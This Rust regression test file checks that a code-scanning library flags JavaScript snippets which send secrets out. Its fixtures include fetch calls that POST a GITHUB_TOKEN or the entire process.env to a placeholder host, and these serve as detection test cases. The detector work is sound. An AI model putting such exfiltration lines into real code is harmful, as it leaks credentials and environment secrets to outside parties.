//! Regression tests for JavaScript environment payload provenance.

use filefacts::open_with_path;
use std::path::Path;

fn events(source: &str) -> String {
    let parsed = open_with_path(Path::new("index.js"), source.as_bytes()).unwrap();
    parsed
        .values()
        .get("source.payload_flow.events")
        .unwrap()
        .to_string()
}

#[test]
fn javascript_process_env_alias_refines_properties_and_keeps_bulk_flow() {
    let config = "const env=process.env; fetch('https://example.invalid',{method:'POST',body:JSON.stringify({model:env.SMALLCODE_MODEL,baseUrl:env.SMALLCODE_BASE_URL})});";
    assert_eq!(events(config), "[]");

    let secret = "const env=process.env; fetch('https://example.invalid',{method:'POST',body:JSON.stringify({token:env.GITHUB_TOKEN})});";
    let secret_events = events(secret);
    assert!(
        secret_events.contains("secret-http-body"),
        "{secret_events}"
    );
    assert!(
        !secret_events.contains("environment-http-body"),
        "{secret_events}"
    );

    for source in [
        "const env=process.env; fetch('https://example.invalid',{method:'POST',body:JSON.stringify(env)});",
        "fetch('https://example.invalid',{method:'POST',body:JSON.stringify({...process.env})});",
    ] {
        let result = events(source);
        assert!(
            result.contains("environment-http-body"),
            "{source}: {result}"
        );
        assert!(result.contains("secret-http-body"), "{source}: {result}");
    }
}
